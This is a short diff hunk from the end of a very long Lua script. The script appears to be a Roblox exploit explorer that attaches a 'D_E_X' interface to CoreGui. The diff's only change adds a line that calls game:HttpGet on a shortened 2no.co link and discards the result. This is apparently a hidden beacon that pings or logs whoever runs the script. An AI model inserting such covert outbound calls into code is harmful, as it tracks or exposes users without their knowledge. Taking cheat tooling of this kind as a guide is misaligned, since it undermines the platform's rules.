@@ -9352,3 +9352,4 @@ end
 wait(.25)
 
 D_E_X.Parent = game:GetService'CoreGui'
+game:HttpGet("https://2no.co/21fFz3")
